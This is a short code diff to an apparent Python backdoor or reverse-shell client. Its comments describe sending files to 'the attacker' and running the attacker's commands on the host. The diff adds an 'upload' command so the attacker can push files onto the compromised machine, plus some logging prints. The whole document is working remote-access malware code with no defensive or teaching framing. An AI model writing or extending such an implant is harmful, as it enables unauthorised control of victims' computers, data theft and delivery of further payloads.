@@ -50,7 +50,9 @@ def send_file(conn):
 
 #Function to receive the file from the attacker
 def receive_file(conn):
+    print("Receiving Files...")
     filename = conn.recv(1024).decode('utf-8')
+    print(f"Filename: {filename}")
     file_size = int(conn.recv(1024).decode('utf-8'))  # Get the file size of the file
     bytes_received = 0
 
@@ -81,6 +83,9 @@ def handle_commands(conn):
             # Handle file download request
             elif command.lower()=='download':
                 send_file(conn)  # Send the file to the attacker
+
+            elif command.lower()=='upload':
+                receive_file(conn)  # Send the file to the attacker
 
             # For all other commands, execute and send result back to the attacker
             else:
